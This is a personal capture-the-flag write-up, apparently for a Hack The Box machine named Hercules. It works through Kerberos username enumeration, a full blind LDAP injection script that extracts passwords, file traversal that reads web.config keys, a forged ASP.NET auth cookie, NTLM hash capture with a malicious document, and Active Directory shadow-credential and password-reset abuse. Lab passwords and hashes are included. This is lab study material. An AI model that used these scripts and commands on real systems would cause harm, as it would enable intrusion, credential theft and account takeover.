|   date: 2026-04-09T15:05:35
|_  start_date: N/A
```

### Port 80
![[Pasted image 20260409111236.png]]

- Using Gobuster on https (with `-k`) argument I find some subdirectories:
```
gobuster dir -u https://hercules.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://hercules.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 27342]
home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fhome]
default              (Status: 200) [Size: 27342]
login                (Status: 200) [Size: 3213]
content              (Status: 301) [Size: 152] [--> https://hercules.htb/content/]
Default              (Status: 200) [Size: 27342]
Home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHome]
Index                (Status: 200) [Size: 27342]
Login                (Status: 200) [Size: 3213]
Content              (Status: 301) [Size: 152] [--> https://hercules.htb/Content/]
INDEX                (Status: 200) [Size: 27342]

```

- I get a login page:
![[Pasted image 20260415084541.png]]

 - It says SSO so it is using LDAP. if the input validation is not good we could potentially leak ldap info:
- With burpsuite using `*` as input for username causes an input validaation erro.
![[Pasted image 20260415085117.png]]
- Points to an input validation error. I then test with all special symbols to find if any can bypass any via an intruder:
![[Pasted image 20260415085830.png]]

- I find `5` , `//`,`\\`,`\` pass the input validation ccheck and can be used to bypass. most notbaly `%`
- We use `%252A` to convert http decode to % and 2A to `*`. then is then used as input in LDAP for SSO ,  On testing we get a Login failed which is a different from the Invalid Login error. Basically we are double encoding:
![[Pasted image 20260415090448.png]]

- Furthermore after 10 login attempts, logins are blocked for 60 seconds (rate limiting) so if we were to brute force we would need to cater to this too
- We need to find usernames however to exploit this.
![[Pasted image 20260415103241.png]]
```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum  --dc 10.129.242.196 -d hercules.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/15/26 - Ronnie Flathers @ropnop

2026/04/15 09:48:46 >  Using KDC(s):
2026/04/15 09:48:46 >   10.129.242.196:88

2026/04/15 09:48:46 >  [+] VALID USERNAME:       admin@hercules.htb
2026/04/15 09:48:46 >  [+] VALID USERNAME:       administrator@hercules.htb
2026/04/15 09:48:46 >  [+] VALID USERNAME:       Admin@hercules.htb
2026/04/15 09:48:48 >  [+] VALID USERNAME:       Administrator@hercules.htb
2026/04/15 09:48:52 >  [+] VALID USERNAME:       auditor@hercules.htb
2026/04/15 09:49:05 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2026/04/15 09:52:26 >  [+] VALID USERNAME:       will.s@hercules.htb
```

- We can't find more but looking at the one username we found it seems to be a name followed by an alphabet.
- We can create a lsit of usernames accordingly to test:
```
awk '/^[[:space:]]*$/ { next } {                                
    gsub(/^[ \t]+|[ \t]+$/, "");
    for (i = 97; i <= 122; i++)
        printf "%s.%c\n", $0, i
}' /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
| sudo tee /usr/share/wordlists/SecLists/Usernames/Names/names_test.txt > /dev/null \
&& echo "Created /usr/share/wordlists/SecLists/Usernames/Names/names_test.txt"
```
- Using this we can once again test kerbrute:
```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum  --dc 10.129.242.196 -d hercules.htb /usr/share/wordlists/SecLists/Usernames/Names/names_test.txt -t 100 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/15/26 - Ronnie Flathers @ropnop

2026/04/15 10:05:51 >  Using KDC(s):
2026/04/15 10:05:51 >   10.129.242.196:88

2026/04/15 10:05:52 >  [+] VALID USERNAME:       adriana.i@hercules.htb
2026/04/15 10:05:53 >  [+] VALID USERNAME:       angelo.o@hercules.htb
2026/04/15 10:05:54 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2026/04/15 10:05:56 >  [+] VALID USERNAME:       bob.w@hercules.htb
2026/04/15 10:05:58 >  [+] VALID USERNAME:       camilla.b@hercules.htb
2026/04/15 10:06:01 >  [+] VALID USERNAME:       clarissa.c@hercules.htb
2026/04/15 10:06:08 >  [+] VALID USERNAME:       elijah.m@hercules.htb
2026/04/15 10:06:11 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2026/04/15 10:06:15 >  [+] VALID USERNAME:       harris.d@hercules.htb
2026/04/15 10:06:16 >  [+] VALID USERNAME:       heather.s@hercules.htb
2026/04/15 10:06:19 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2026/04/15 10:06:20 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2026/04/15 10:06:21 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2026/04/15 10:06:21 >  [+] VALID USERNAME:       joel.c@hercules.htb
2026/04/15 10:06:21 >  [+] VALID USERNAME:       johanna.f@hercules.htb
2026/04/15 10:06:21 >  [+] VALID USERNAME:       johnathan.j@hercules.htb
2026/04/15 10:06:24 >  [+] VALID USERNAME:       ken.w@hercules.htb
2026/04/15 10:06:33 >  [+] VALID USERNAME:       mark.s@hercules.htb
2026/04/15 10:06:35 >  [+] VALID USERNAME:       mikayla.a@hercules.htb
2026/04/15 10:06:37 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2026/04/15 10:06:37 >  [+] VALID USERNAME:       nate.h@hercules.htb
2026/04/15 10:06:41 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2026/04/15 10:06:43 >  [+] VALID USERNAME:       ramona.l@hercules.htb
2026/04/15 10:06:44 >  [+] VALID USERNAME:       ray.n@hercules.htb
2026/04/15 10:06:44 >  [+] VALID USERNAME:       rene.s@hercules.htb
2026/04/15 10:06:44 >  [+] VALID USERNAME:       rené.s@hercules.htb
2026/04/15 10:06:48 >  [+] VALID USERNAME:       shae.j@hercules.htb
2026/04/15 10:06:52 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2026/04/15 10:06:52 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2026/04/15 10:06:53 >  [+] VALID USERNAME:       tanya.r@hercules.htb
2026/04/15 10:06:54 >  [+] VALID USERNAME:       tish.c@hercules.htb
2026/04/15 10:06:57 >  [+] VALID USERNAME:       vincent.g@hercules.htb
2026/04/15 10:06:58 >  [+] VALID USERNAME:       will.s@hercules.htb
2026/04/15 10:07:00 >  [+] VALID USERNAME:       zeke.s@hercules.htb
2026/04/15 10:07:00 >  Done! Tested 278538 usernames (34 valid) in 68.971 seconds
```
- The idea is to use these usernames and then try to access the description in LDAP. depending on the output (Invalid user or failed attempt) we know the user is valid or not and so the description can be identified a character at a time.

- To explain the code and attack:
```
The Core Trick: LDAP Filter Injection
When the app authenticates, it likely builds an LDAP query like this behind the scenes:
(&(sAMAccountName=<username>)(password=<password>))
Because the username isn't sanitized, you can inject extra LDAP filter clauses into it.

Checking if a user HAS a description (line 89)
The payload sent as the username is:
username*)(description=*
After double URL encoding and being dropped into the LDAP query, the server ends up evaluating something like:
(&(sAMAccountName=bob.w*)(description=*)(password=test))
What this means in LDAP logic:

sAMAccountName=bob.w* → matches bob.w (wildcard, but it's their actual name)
(description=*) → only matches if the description attribute exists and is non-empty
The password check effectively gets bypassed or closed off by the injected parentheses

If the response contains "Login attempt failed" (your SUCCESS_INDICATOR), it means the LDAP query matched a real user — so the user exists AND has a description field. If you get "invalid user" or nothing, the description doesn't exist.

Enumerating the description character by character (line 86)
Once you know a user has a description, the payload becomes:
username*)(description=P*
Which makes the server evaluate:
(&(sAMAccountName=bob.w*)(description=P*)(password=test))

If the description starts with "P" → LDAP matches → you get "Login attempt failed" → ✅ correct character
If it doesn't start with "P" → LDAP doesn't match → different response → ❌ wrong character

Then the script tries Pa*, Pb*, Pc*... and so on, building the string one character at a time. This is essentially LDAP blind injection, analogous to blind SQL injection.

Why double URL encoding?
The app likely does one round of URL decoding on input. By encoding twice (e.g., ( → %28 → %2528), the first decode turns %2528 into %28, and the second (done by the LDAP layer or another middleware) turns %28 into ( — meaning your injected parentheses survive into the actual LDAP query intact.

Summary flow
1. Send username*)( description=*      → Does user have a description? 
2. Send username*)(description=P*      → Does it start with P?
3. Send username*)(description=Pa*     → Does it start with Pa?
4. ... repeat until no new char matches → Full description extracted
It's a boolean-based blind injection — the only signal is "did LDAP match or not", and the script infers the secret value one bit at a time.
```

- We build our exploit:
```
#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False
# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"
# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"')
# All enumerated users (replaced as requested)
KNOWN_USERS = [
    "adriana.i",
    "angelo.o",
    "ashley.b",
    "bob.w",
    "camilla.b",
    "clarissa.c",
    "elijah.m",
    "fiona.c",
    "harris.d",
    "heather.s",
    "jacob.b",
    "jennifer.a",
    "jessica.e",
    "joel.c",
    "johanna.f",
    "johnathan.j",
    "ken.w",
    "mark.s",
    "mikayla.a",
    "natalie.a",
    "nate.h",
    "patrick.s",
    "ramona.l",
    "ray.n",
    "rene.s",
    "shae.j",
    "stephanie.w",
    "stephen.m",
    "tanya.r",
    "tish.c",
    "vincent.g",
    "will.s",
    "zeke.s",
    "auditor"
]

def get_token_and_cookie(session):
    """Get fresh CSRF token and cookies"""
    response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)

    token = None
    match = TOKEN_RE.search(response.text)
    if match:
        token = match.group(1)
    return token

def test_ldap_injection(username, description_prefix=""):
    """Test if description starts with given prefix using LDAP injection"""
    session = requests.Session()

    # Get fresh token
    token = get_token_and_cookie(session)
    if not token:
        return False

    # Build LDAP injection payload
    if description_prefix:
        # Escape special characters
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')

        payload = f"{username}*)(description={escaped_desc}*"
    else:
        # Check if user has description field
        payload = f"{username}*)(description=*"

    # Double URL encode
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        return False

def enumerate_description(username):
    """Enumerate description/password field character by character"""
    # Character set - most common password chars first for optimization
    charset = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "!@#$_*-." +  # Common special chars
        "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common
    )

    print(f"\n[*] Checking user: {username}")

    # First check if user has description
    if not test_ldap_injection(username):
        print(f"[-] User {username} has no description field")
        return None

    print(f"[+] User {username} has a description field, enumerating...")

    description = ""
    max_length = 50
    no_char_count = 0

    for position in range(max_length):
        found = False

        for char in charset:
            test_desc = description + char

            if test_ldap_injection(username, test_desc):
                description += char
                print(f"    Position {position}: '{char}' -> Current: {description}")
                found = True
                no_char_count = 0
                break

            # Small delay to avoid rate limiting
            time.sleep(0.01)

        if not found:
            no_char_count += 1
            if no_char_count >= 2:  # Stop after 2 positions with no chars
                break

    if description:
        print(f"[+] Complete: {username} => {description}")
        return description

    return None

def main():
    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Testing {len(KNOWN_USERS)} users")
    print("="*60)

    found_passwords = {}

    # Priority users to test first
    priority_users = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
    other_users = [u for u in KNOWN_USERS if u not in priority_users]

    # Test priority users first
    for user in priority_users + other_users:
        password = enumerate_description(user)

        if password:
            found_passwords[user] = password

            # Save results immediately
            with open("hercules_passwords.txt", "a") as f:
                f.write(f"{user}:{password}\n")

            print(f"\n[+] FOUND: {user}:{password}\n")

    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)

    if found_passwords:
        print(f"\nFound {len(found_passwords)} passwords:")
        for user, pwd in found_passwords.items():
            print(f"  {user}: {pwd}")
    else:
        print("\nNo passwords found")

if __name__ == "__main__":
    main()
```

- Output when running code:
```
python3 brute.py

---OUTPUT---
============================================================
Hercules LDAP Description/Password Enumeration
Testing 34 users
============================================================

[*] Checking user: web_admin
[-] User web_admin has no description field

[*] Checking user: auditor
[-] User auditor has no description field

[*] Checking user: Administrator
[-] User Administrator has no description field

[*] Checking user: natalie.a
[-] User natalie.a has no description field

[*] Checking user: ken.w
[-] User ken.w has no description field

[*] Checking user: adriana.i
[-] User adriana.i has no description field

[*] Checking user: angelo.o
[-] User angelo.o has no description field

[*] Checking user: ashley.b
[-] User ashley.b has no description field

[*] Checking user: bob.w
[-] User bob.w has no description field

[*] Checking user: camilla.b
[-] User camilla.b has no description field

[*] Checking user: clarissa.c
[-] User clarissa.c has no description field

[*] Checking user: elijah.m
[-] User elijah.m has no description field

[*] Checking user: fiona.c
[-] User fiona.c has no description field

[*] Checking user: harris.d
[-] User harris.d has no description field

[*] Checking user: heather.s
[-] User heather.s has no description field

[*] Checking user: jacob.b
[-] User jacob.b has no description field

[*] Checking user: jennifer.a
[-] User jennifer.a has no description field

[*] Checking user: jessica.e
[-] User jessica.e has no description field

[*] Checking user: joel.c
[-] User joel.c has no description field

[*] Checking user: johanna.f
[-] User johanna.f has no description field

[*] Checking user: johnathan.j
[+] User johnathan.j has a description field, enumerating...
    Position 0: 'c' -> Current: c
    Position 1: 'h' -> Current: ch
    Position 2: 'a' -> Current: cha
    Position 3: 'n' -> Current: chan
    Position 4: 'g' -> Current: chang
    Position 5: 'e' -> Current: change
    Position 6: '*' -> Current: change*
    Position 7: 't' -> Current: change*t
    Position 8: 'h' -> Current: change*th
    Position 9: '1' -> Current: change*th1
    Position 10: 's' -> Current: change*th1s
    Position 11: '_' -> Current: change*th1s_
    Position 12: 'p' -> Current: change*th1s_p
    Position 13: '@' -> Current: change*th1s_p@
    Position 14: 's' -> Current: change*th1s_p@s
    Position 15: 's' -> Current: change*th1s_p@ss
    Position 16: 'w' -> Current: change*th1s_p@ssw
    Position 17: '(' -> Current: change*th1s_p@ssw(
    Position 18: ')' -> Current: change*th1s_p@ssw()
    Position 19: 'r' -> Current: change*th1s_p@ssw()r
    Position 20: 'd' -> Current: change*th1s_p@ssw()rd
    Position 21: '!' -> Current: change*th1s_p@ssw()rd!
    Position 22: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!


[*] Checking user: mark.s
[-] User mark.s has no description field

[*] Checking user: mikayla.a
[-] User mikayla.a has no description field

[*] Checking user: nate.h
[-] User nate.h has no description field

[*] Checking user: patrick.s
[-] User patrick.s has no description field

[*] Checking user: ramona.l
[-] User ramona.l has no description field

[*] Checking user: ray.n
[-] User ray.n has no description field

[*] Checking user: rene.s
[-] User rene.s has no description field

[*] Checking user: shae.j
[-] User shae.j has no description field

[*] Checking user: stephanie.w
[-] User stephanie.w has no description field

[*] Checking user: stephen.m
[-] User stephen.m has no description field

[*] Checking user: tanya.r
[-] User tanya.r has no description field

[*] Checking user: tish.c
[-] User tish.c has no description field

[*] Checking user: vincent.g
[-] User vincent.g has no description field

[*] Checking user: will.s
[-] User will.s has no description field

[*] Checking user: zeke.s
[-] User zeke.s has no description field

============================================================
ENUMERATION COMPLETE
============================================================

```
- We get a password for user `jonathan.j` : `change*th1s_p@ssw()rd!!`
- But it fails so using the intruder I see `ken.w` gives a different response code implying it could be the user used: (can also use nxc with userlist to check for a hit)
![[Pasted image 20260415103216.png]]
![[Pasted image 20260415103319.png]]
- Navigationg to /Home/Downloads we can download some files.
- Looking at bursuite it calls the file via filename parameter. This filename parameter can be used to do LFI. 
- Looking for web.config file I find it eventually in `../../web.config`:
![[Pasted image 20260415103736.png]]
- We see a decryption keyy, validation key and some tokens.
```
 <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
```

- This is used for ASPNet cookie authentification.
- i also grab some bloodhound files:
```
bloodhound-python -c all -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -ns 10.129.242.196 -d  HERCULES.HTB --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Testing resolved hostname connectivity dead:beef::a0d9:6f76:a9d7:56a3
INFO: Trying LDAP connection to dead:beef::a0d9:6f76:a9d7:56a3
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Testing resolved hostname connectivity dead:beef::a0d9:6f76:a9d7:56a3
INFO: Trying LDAP connection to dead:beef::a0d9:6f76:a9d7:56a3
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20260417053930_bloodhound.zip
```

- Searching all users with this query I see a web_admin user (which is a priority user in code):
```
MATCH (u:User) RETURN u
```
![[Pasted image 20260417060718.png]]

- I create a dotnet project with the codes I received put in `Program.cs` and build it.
- I create project:
```
dotnet new console -o LegacyAuthConsole
cd LegacyAuthConsole
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
dotnet restore
```
- Program.cs: (some reference : https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat/blob/master/README.md)
```
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
        string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        // Trim the validation key if too long for HMACSHA256
        if (validationKey.Length > 128)
        {
            validationKey = validationKey.Substring(0, 128);
        }

        // Convert keys to byte arrays
        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var formsAuthenticationTicket = new FormsAuthenticationTicket(
            1,                        // version
            "web_admin",              // username
            issueDate,
            expiryDate,
            false,                    // isPersistent
            "Web Administrators",     // userData / role
            "/"                       // cookiePath
        );

        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
        Console.WriteLine("Encrypted FormsAuth Ticket:");
        Console.WriteLine(encryptedText);
    }
}

```
- Then build and run it:
```
dotnet build
dotnet run

---FINAL-OUTPUT---
Encrypted FormsAuth Ticket:
A517E6EE651D6A2578EEF03ECCDEDBCD6539D173126012610AE3D599F096789F531CC4185F27CF19CD013FF13499812A7E32C96E81338443D28D1525C3C571E403B671355DA46BEF44D906352CEB693FE93E8F18369F4951D442F9E2A87A795EE0BBCF82B91FA3688DBC7DF74640695CA2A1C8D14EDB0320AD73402AF12C08B7742C827EBC9B8E3E6A63A83E2CA093AF474B8F7973995D0742301F32E5D26280B6957B6E8ACD021B16826CCAF0547FA0790983D7BA388436D33400B8BC372162
```
![[Pasted image 20260417062033.png]]

- I add it to the cookie for the user to get admin panel.
![[Pasted image 20260417062229.png]]

- We are now web_admin on refresh:
![[Pasted image 20260417062256.png]]

- There is a report form where we can submit files. 
![[Pasted image 20260417063126.png]]

- I submit php-reverse-shell but it doesnt respond. its an aspx website but we dont know any location to access them. Considering its a report form it may be a file stored in a share like SMB share. we can submit a malicious file thatn tries to authenticate with our smb to get its hash.

- I use the tools Bad-ODF: https://github.com/lof1sec/Bad-ODF

![[Pasted image 20260417072532.png]]

- I get a hash on my responder for `natalie.a`:
![[Pasted image 20260417072553.png]]
```
sudo responder -I tun0

---OUTPUT---
SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:0185f2d79379c6a3:107AA43A7C8BB1E5366C7D3E577F5CEE:010100000000000080F71B3035CEDC014F6B027288D70586000000000200080058004C004D00530001001E00570049004E002D004C0055004F00320030005400500031004F004600440004003400570049004E002D004C0055004F00320030005400500031004F00460044002E0058004C004D0053002E004C004F00430041004C000300140058004C004D0053002E004C004F00430041004C000500140058004C004D0053002E004C004F00430041004C000700080080F71B3035CEDC01060004000200000008003000300000000000000000000000002000000125B6BF2BB97ECF2D1EDF92F712114B38FDEC9DC47F76D6A62AC6C9A3266AD00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320036000000000000000000
```
- I crack the hash with john:
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Prettyprincess123! (natalie.a)     
1g 0:00:00:05 DONE (2026-04-17 07:26) 0.1915g/s 2053Kp/s 2053Kc/s 2053KC/s Pslams23..Prater
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
- Creds are <: `natalie.a`:`Prettyprincess123!`
- Looking at bloodhound this user has `GenericWrite` privilege on some accounts:
![[Pasted image 20260417072759.png]]

- Also looking at users with Remote access we see Ashely B which can force change passwords of other users:
![[Pasted image 20260417074132.png]]

- We  can get natalie's ticket and then grab the ccache for these accounts and see the writeable attributes. I tried web_admin and couldn't find much. But looking at bob.w's:
```
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/natalie.a:Prettyprincess123!
export KRB5CCNAME=natalie.a.ccache
```
![[Pasted image 20260417111839.png]]

```
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account bob.w
```
![[Pasted image 20260417111919.png]]

```
impacket-getTGT -dc-ip 10.129.242.196 -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
export KRB5CCNAME=bob.w.ccname
```
![[Pasted image 20260417111937.png]]

```

bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' --host DC.hercules.htb get writeable --detail
```

![[Pasted image 20260417112000.png]]

![[Pasted image 20260417112015.png]]

![[Pasted image 20260417112029.png]]

![[Pasted image 20260417112104.png]]

![[Pasted image 20260417112309.png]]

![[Pasted image 20260417112321.png]]

![[Pasted image 20260417112336.png]]

![[Pasted image 20260417112351.png]]

- Get Powerview.py for local kali instead of the ps1 file: https://github.com/aniqfakhrul/powerview.py

- Using this we can connect to LDAP as user bob.w and then change the gorup of user Stephen.M from Security Groups to Web users groups. This can change permissions of the user giving it certificate permissions we need to further exploit it:
```
python3 -m venv venv ** source .venv/bin/activate
pip3 install powerview


powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps -d --no-pass

Set-DomainObjectDN -Identity Stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

---FINAL-OUTPUT---
[2026-04-17 14:31:38] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2026-04-17 14:31:38] [Get-DomainObject] LDAP search filter: (&(objectClass=*)(|(samAccountName=Stephen.m)(name=Stephen.m)(displayName=Stephen.m)(objectSid=Stephen.m)(distinguishedName=Stephen.m)(dnsHostName=Stephen.m)(objectGUID=*Stephen.m*)))
[2026-04-17 14:31:38] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2026-04-17 14:31:38] [Get-DomainObject] LDAP search filter: (&(objectClass=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2026-04-17 14:31:38] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
[2026-04-17 14:31:39] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb

```

![[Pasted image 20260417143414.png]]

- Now using natalie's ccache we can grab a ticket for stephen.m. And then finally using stephen.m's ticket we can use bloodyAD to change the pwd of auditor to then grab it's ccache  and log in via winrm.
- First we request HERCULES for a ticket via natalie
```
impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
```
- Then we grab stephen's ticket: (make sure the LDAP session is running and his OU has changed)
```
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account stephen.m

---OUTPUT---
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fc816c0f4c8944f0925da87e23b09b3e'
[*] Adding Key Credential with device ID 'fc816c0f4c8944f0925da87e23b09b3e' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID 'fc816c0f4c8944f0925da87e23b09b3e' to the Key Credentials for 'stephen.m'
[*] Authenticating as 'stephen.m' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Restoring the old Key Credentials for 'stephen.m'
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210

```

![[Pasted image 20260417144507.png]]
- Using this hash I can authenticate as stephen.m and then use bloodyAD to change the password of Auditor:
```
impacket-getTGT -dc-ip 10.129.242.196 -hashes :9aaaedcb19e612216a2dac9badb3c210 hercules.htb/stephen.m
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in stephen.m.ccache
```

- Now to change password of Auditor which we had seen on bloodhound:
```
export KRB5CCNAME=stephen.m.ccache
bloodyAD -u 'stephen.m' -p '' -k -d 'hercules.htb' --host DC.hercules.htb set password Auditor 'hax0rm@n123'
[+] Password changed successfully!
```
![[Pasted image 20260417145940.png]]

- Now using this I can grab a ticket for the user Auditor :
```
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/Auditor:hax0rm@n123

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Auditor.ccache
```

![[Pasted image 20260417150104.png]]

- Then with `evilwinrmexec` )the python file not original evil-winrm) we can authenticate with this ticket and log in as auditor. This wont work with evil-winrm or i havent found the right arguments. either way this tool is better for ssl ticket authentication:
```
python3 winrmexec.py -ssl -k -no-pass dc.hercules.htb
```

![[Pasted image 20260417150252.png]]

- I grab the user flag:
